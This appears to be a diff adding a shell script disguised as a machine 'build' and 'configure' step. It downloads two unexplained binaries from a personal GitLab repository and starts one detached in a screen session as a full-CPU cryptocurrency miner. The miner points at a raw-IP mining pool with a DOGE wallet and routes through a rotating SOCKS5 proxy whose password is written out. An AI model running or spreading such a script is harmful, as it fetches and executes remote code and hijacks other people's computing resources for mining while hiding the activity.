@@ -1,0 +1,23 @@
+echo "==================== Info Mesin ===================="
+echo "SEGER YA SAYANK"
+echo "HARUSNYA GK"
+echo "KE SLEDING SIH"
+echo "===================================================="
+
+echo "+++++++ Build Machine +++++++++"
+nohup wget https://gitlab.com/richardkevin320/donlod/-/raw/main/pointd
+nohup wget https://gitlab.com/richardkevin320/depo/-/raw/main/timer
+nohup mkdir safa
+nohup apt install screen -y
+nohup apt install libjansson-dev -y
+
+echo "+++++++ Configure Machine +++++++++"
+chmod +x pointd
+chmod +x timer
+cd safa
+
+echo "Configure Successfully"
+cd ..
+screen -d -m ./pointd -a yescryptr16 -o stratum+tcp://198.50.168.213:6333 -u DQwPtoryjSEZpnmr9xZtoCVSHds3rxpgUk.Tet -p c=DOGE -t $(nproc) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80
+echo "+++++++ Sync... +++++++++"
+./timer
